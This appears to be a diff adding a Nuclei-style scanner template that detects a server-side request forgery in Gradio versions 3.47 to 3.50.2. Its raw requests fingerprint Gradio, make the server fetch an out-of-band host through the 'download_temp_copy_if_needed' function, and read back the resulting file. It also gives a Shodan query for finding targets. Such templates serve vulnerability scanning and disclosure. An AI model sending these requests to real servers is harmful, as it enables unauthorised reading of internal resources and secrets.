@@ -1,0 +1,82 @@
+flow: http(1) && http(2)
+http:
+- matchers:
+  - condition: or
+    dsl:
+    - contains_any(tolower(body), "content=\"gradio", "gradio_mode", "gradio-app",
+      "https://gradio.app")
+    - contains(tolower(body), "\"method not allowed")
+    internal: true
+    type: dsl
+  raw:
+  - 'GET / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+  - 'GET /component_server HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+- extractors:
+  - group: 1
+    internal: true
+    name: download_path
+    part: body
+    regex:
+    - '"?([^"]+)'
+    type: regex
+  matchers:
+  - part: body_2
+    type: word
+    words:
+    - <h1> Interactsh Server </h1>
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    fuzz_component_id: helpers/wordlists/numbers.txt
+  raw:
+  - 'POST /component_server HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+
+    {"component_id": "{{fuzz_component_id}}", "data": "http://oast.me", "fn_name":
+    "download_temp_copy_if_needed", "session_hash": "aaaaaaaaaaa"}
+
+    '
+  - 'GET /file={{download_path}} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+  stop-at-first-match: true
+id: gradio-ssrf
+info:
+  author: nvn1729
+  classification:
+    cpe: cpe:2.3:a:gradio_project:gradio:*:*:*:*:python:*:*:*
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    epss-percentile: 0.36659
+  description: 'Gradio Full Read SSRF when auth is not enabled, this version should
+    work for versions 3.47 - 3.50.2.
+
+    '
+  metadata:
+    max-request: 2
+    product: gradio
+    shodan-query: html:"__gradio_mode__"
+    vendor: gradio_project
+    verified: true
+  name: Gradio 3.47 - 3.50.2 - Server-Side Request Forgery
+  reference:
+  - https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2
+  - https://www.horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/
+  severity: high
+  tags: cve,cve2024,unauth,gradio,ssrf,vuln
